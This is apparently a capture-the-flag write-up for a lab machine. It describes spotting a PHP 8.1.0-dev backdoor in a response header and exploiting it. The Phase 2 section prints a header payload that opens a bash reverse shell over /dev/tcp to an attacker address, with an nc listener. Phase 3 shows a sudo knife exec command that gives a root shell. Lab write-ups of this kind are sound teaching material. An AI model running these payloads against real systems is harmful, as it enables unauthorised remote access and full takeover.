## Phase 1: Enumeration

As always we start off with an nmap scan:


Nmap didn't show any outdated services, so we can check out the website
Visiting 10.10.10.242 we can see that it's a static page - nothing interesting there: 
> Checking the source code with ctrl+u doesn't show anything interesting either, however
> After going over to network tab through developer tools I saw this response header: ```X-Powered-By: PHP/8.1.0-dev```
* Since PHP 8.1.0 is outdated it's probably vulnerable to an exploit => ```https://www.exploit-db.com/exploits/49933```

## Phase 2: Exploitation

First I set up nc to listen on port 9001 (nc -lvnp 9001), then
I used Burp Suite and FoxyProxy to intercept request of http://10.10.10.242/ and send this request:
(image)
* Added ```User-Agentt:zerodiumsystem("bin/bash -c 'bash -i >& /dev/tcp/10.10.14.4/9001 0>&1 '");```

I sent the request and got a reverse shell: 
(image)
I then navigated to home/james and used ```cat user.txt``` to obtain the user flag
(user flag image)

## Phase 3: Privilege escalation

I started things out by running sudo -l to see which commands can be executed as sudo on this machine, as it turns out, we can execute /usr/bin/knife. Great!
(image of sudo-l)

So now I simply executed ```sudo knife exec --exec "exec '/bin/sh -i' "``` in the command line to get root.
After that I navigated to /root and used ```cat root.txt``` to get root flag
(root flag image)

And the box is complete!
